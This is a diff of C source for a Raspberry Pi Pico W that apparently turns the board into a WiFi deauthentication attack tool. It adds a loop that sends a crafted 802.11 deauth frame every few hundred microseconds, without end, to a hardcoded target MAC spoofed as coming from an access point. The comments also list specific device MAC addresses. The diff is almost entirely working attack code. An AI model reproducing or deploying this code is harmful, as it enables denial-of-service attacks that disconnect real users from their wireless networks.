@@ -1,7 +1,4 @@
-#include <stdio.h>
-#include "pico/stdlib.h"
-#include "pico/cyw43_arch.h"
-#include "lwip/pbuf.h"
+#include "deauth.h"
 
 void set_payload(struct pbuf *p, const char *data, u16_t data_len)
 {
@@ -46,6 +43,23 @@ bool joinAP(char *ssid, char *password)
     }
 }
 
+void deauth_blocking(struct pbuf* p) {
+    if (p != NULL) {
+        sleep_ms(1000);
+        printf("\nsending out deauth...\n");
+        while(true) {
+            printf("\nSending out: \n");
+            for (int i = 0; i < p->len; i++) {
+                printf("%02x ", ((uint8_t*)p->payload)[i]);
+            }
+            cyw43_send_ethernet(&cyw43_state, CYW43_ITF_STA, p->tot_len, (void *)p, true);
+            struct ieee_80211_hdr* hdr = (struct ieee_80211_hdr*)p->payload;
+            hdr->sequence_control += 0x10;
+            sleep_us(300);
+        }
+    }
+}
+
 void deauth()
 {
     struct pbuf *p = pbuf_alloc(PBUF_RAW, 26, PBUF_RAM);
@@ -53,9 +67,9 @@ void deauth()
     uint8_t deauthPacket[26] = {
         /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
         /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
-        /*  4 - 9  */ 0xEA, 0x28, 0x58, 0x73, 0x22, 0xC3, // reciever (target) 0xEA, 0x28, 0x58, 0x73, 0x22, 0xC3
-        /* 10 - 15 */ 0xA2, 0x22, 0x27, 0x05, 0xFE, 0xBE, // source (ap)0xEA, 0x17, 0x93, 0xC2, 0x8D, 0x3C
-        /* 16 - 21 */ 0xA2, 0x22, 0x27, 0x05, 0xFE, 0xBE, // BSSID (ap)0xA2, 0x22, 0x27, 0x05, 0xFE, 0xBE
+        /*  4 - 9  */ 0xEA, 0x28, 0x58, 0x73, 0x22, 0xC3, // reciever (target) e8:fb:e9:bc:c5:ff
+        /* 10 - 15 */ 0xA2, 0x22, 0x27, 0x05, 0xFE, 0xBE, // source (ap) 18:58:80:0b:a0:77
+        /* 16 - 21 */ 0xA2, 0x22, 0x27, 0x05, 0xFE, 0xBE, // BSSID (ap) 18:58:80:0b:a0:79
         /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
         /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
     };
